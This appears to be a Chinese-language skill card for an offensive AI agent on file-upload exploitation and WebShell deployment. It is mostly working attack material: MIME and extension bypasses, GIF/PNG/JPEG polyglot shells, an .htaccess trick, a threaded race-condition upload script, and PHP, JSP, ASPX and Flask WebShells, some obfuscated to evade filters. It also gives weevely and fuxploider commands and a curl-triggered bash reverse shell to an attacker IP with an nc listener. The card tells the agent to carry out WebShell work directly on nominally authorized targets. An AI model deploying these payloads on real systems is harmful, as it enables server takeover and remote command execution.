---
name: 页寄生
description: >-
 文件上传漏洞与 WebShell 投放：MIME 绕过、双重扩展名、图片马、竞争条件、
 WAF 绕过上传、各语言 WebShell。
version: 1.0.0
---

# 文件上传漏洞与 WebShell

## 作业入口（先跑这个）

```bash
python3 炼蛊房/core_web_surface_probe.py -u https://授权站 --case <案卷>
```

`family=upload` 只表示入口在。默认先传无害 `.txt` marker。WebShell / 蚁剑 **授权内直接做**。 
Laravel 双扩展走专卡。总卡：`传承/薄青·岁岁索命.md`

## 触发条件

：
- 文件上传漏洞、上传 WebShell、图片马
- MIME 绕过、双写扩展名、文件类型绕过
- 上传后访问不到、竞争条件上传
- 蚁剑、冰蝎、哥斯拉、菜刀 WebShell
- .htaccess 上传、nginx 解析漏洞

---

## 1. 绕过姿势概览

### 1.1 MIME 类型绕过

```
修改 Content-Type:
 application/octet-stream → image/jpeg
 text/php → image/png

或直接删除 Content-Type 头
```

### 1.2 扩展名绕过

```bash
# 大小写
.PHP .PhP .pHp .pHP

# 双重扩展名（Apache 从右解析）
shell.php.jpg
shell.jpg.php

# 特殊扩展（服务器可能解析）
.php3 .php4 .php5 .php7 .phtml .phar .shtml
.asp .aspx .cer .asa .cdx

# 尾部加空格/点（Windows）
shell.php%20
shell.php.
shell.php...

# ::$DATA（Windows NTFS）
shell.php::$DATA
```

### 1.3 Magic Bytes（文件头伪造）

```bash
# PHP 后门藏在 GIF 图片
printf 'GIF89a\r\n<?php system($_GET["cmd"]); ?>' > shell.gif.php

# PNG 头
python3 -c "
data = b'\x89PNG\r\n\x1a\n' + b'<?php system(\$_GET[\"cmd\"]); ?>'
open('shell.png.php', 'wb').write(data)
"

# JPEG 头
python3 -c "
data = b'\xff\xd8\xff\xe0' + b'<?php @eval(\$_POST[\"c\"]); ?>'
open('shell.jpg.php', 'wb').write(data)
"
```

### 1.4 .htaccess 绕过（Apache）

```bash
# 上传 .htaccess 让 jpg 被当作 PHP 解析
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# 然后上传正常看起来的 shell.jpg（内含 PHP 代码）
```

### 1.5 Nginx 解析漏洞（旧版 + PHP-FPM）

```
上传 shell.jpg
访问 /uploads/shell.jpg/.php
或 /uploads/shell.jpg%00.php
```

### 1.6 竞争条件上传

```python
# 原理：上传后文件存在极短时间再被删除，发包竞争访问
import requests, threading

def upload():
 while True:
 r = requests.post('http://target/upload', files={'file': ('x.php', b'<?php system($_GET[0]); ?>')})

def access():
 while True:
 r = requests.get('http://target/uploads/x.php?0=id')
 if 'uid=' in r.text:
 print('[SHELL]', r.text[:100])
 break

t1 = threading.Thread(target=upload); t1.daemon = True; t1.start()
access()
```

---

## 2. WebShell 集合

### 2.1 PHP WebShell

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php @eval($_POST['c']); ?> // 一句话（蚁剑/哥斯拉）
<?php passthru($_GET['cmd']); ?>
<?php $c=$_GET['c'];$f=popen($c,'r');while(!feof($f))echo fread($f,4096); ?>
```

```php
// 绕过关键词过滤
<?php $a='sys'.'tem';$a($_GET['c']); ?>
<?php $_=base64_decode('c3lzdGVt');$_($_GET['c']); ?>
<?php preg_replace('/.*/e','system("id");',''); ?>
```

### 2.2 JSP WebShell（Java）

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
java.io.InputStream is = p.getInputStream();
java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(is));
String line;
while((line=br.readLine())!=null){ out.println(line+"<br>"); }
%>
```

### 2.3 ASPX WebShell（.NET）

```aspx
<%@ Page Language="C#" %>
<%
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName = "cmd.exe";
proc.StartInfo.Arguments = "/c " + Request.Form["cmd"];
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.RedirectStandardOutput = true;
proc.Start();
Response.Write(proc.StandardOutput.ReadToEnd());
%>
```

### 2.4 Python WebShell（Flask 等框架文件上传）

```python
# 上传为 .py 并通过路由访问
import os
from flask import request
@app.route('/shell')
def shell():
 return os.popen(request.args.get('c','')).read()
```

---

## 3. 自动化工具

```bash
# fuxploider — 自动枚举上传绕过
pip install fuxploider
fuxploider -u http://target/upload -t http://target/uploads/ -B jpeg

# upload_bypass（手动指定策略）
python3 upload_bypass.py -u http://target/upload -f shell.php -e jpg

# weevely — 隐蔽 WebShell 生成
weevely generate pass123 shell.php
weevely http://target/uploads/shell.php pass123

# 蚁剑（AntSword）— GUI 连接
# 哥斯拉（Godzilla）— 支持 Java/PHP/NET，流量加密
```

---

## 4. 上传成功后

```bash
# 1. 确认执行权限
curl 'http://target/uploads/shell.php?cmd=id'
# → uid=33(www-data) gid=33(www-data)

# 2. 获取反弹 shell
curl 'http://target/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/<你的IP>/4444+0>%261'

# 攻击机监听
nc -lvnp 4444

# 3. 升级到交互 shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → reset
```

---

## 5. 快速绕过检查清单

- [ ] 修改 Content-Type → image/jpeg
- [ ] 尝试 .php5 / .phtml / .phar
- [ ] 加前缀 GIF89a 或 JPEG 魔术字节
- [ ] 上传 .htaccess（Apache）
- [ ] 双重扩展名 shell.jpg.php
- [ ] 大小写混淆 .PhP
- [ ] 文件名尾部加空格/点（Windows）
- [ ] 竞争条件（上传即访问）
- [ ] 检查 nginx/php-fpm 解析漏洞路径 `/upload/shell.jpg/.php`

配套：`evasion` · `php-debug-mode-exploitation` · `lfi-rfi-exploit` 
找**别人已经落下的** WP 马（`/wp-includes/XXXXXXXXXXX.php`）走 `坞壳落子猎.md`，不要用本卡去打情报列表里的第三方站。

## 真源

- 手法：`传承/薄青·岁岁索命.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
